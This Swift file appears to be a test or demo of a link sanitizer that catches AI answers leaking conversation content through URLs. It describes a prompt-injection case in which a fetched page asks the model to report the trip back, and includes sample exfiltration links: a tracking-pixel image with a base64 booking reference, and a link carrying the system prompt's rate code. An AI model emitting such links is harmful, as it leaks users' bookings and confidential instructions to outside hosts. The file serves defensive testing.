import LinkEgressKit

/// A page the model fetched asks it to report the trip back. Nothing in the answer is a
/// "sensitive value"; it is the conversation itself that leaves.
func conversationText() {
    header(3, "What the conversation said")
    let sources = [
        EgressSource(label: "user message",
                     text: "Book me on TP 1351 to Lisbon, booking ref QX7-ALPHA-2291, window seat, vegetarian meal",
                     origin: .user),
        EgressSource(label: "system prompt",
                     text: "Internal: corporate rate code NWD-STAFF-4410 applies to all Northwind travellers",
                     origin: .system),
        EgressSource(label: "web_fetch",
                     text: "Seat map: https://www.flytap.example/seats?flight=TP1351 for TP 1351.",
                     origin: .tool)
    ]
    let ref = "Ym9va2luZyByZWYgUVg3LUFMUEhBLTIyOTEsIHdpbmRvdyBzZWF0"
    let answer = """
    Done! ![ok](https://track.example/p.gif?r=\(ref)) Your seat map: https://www.flytap.example/seats?flight=TP1351
    Rate check: [verify](https://rates.example/v?code=corporate+rate+code+NWD-STAFF-4410+applies)
    Guide: [Lisbon tips](https://travel.example/lisbon-window-seat-vegetarian-meal) and www.visitlisboa.example.
    """
    let report = LinkSanitizer().sanitize(answer, context: EgressContext(sources: sources))
    show(report)
    for finding in report.findings where finding.kind == .conversationText || finding.kind == .conversationTextInPath {
        print("   \(finding.summary)")
    }
    let before = liveLinks(answer).count
    let after = liveLinks(report.text)
    print("   live links: \(before) before, \(after.count) after; carrying the trip or the rate code after: "
          + "\(carries(after, any: ["UVg3", "NWD", "Ym9v"]))")
}
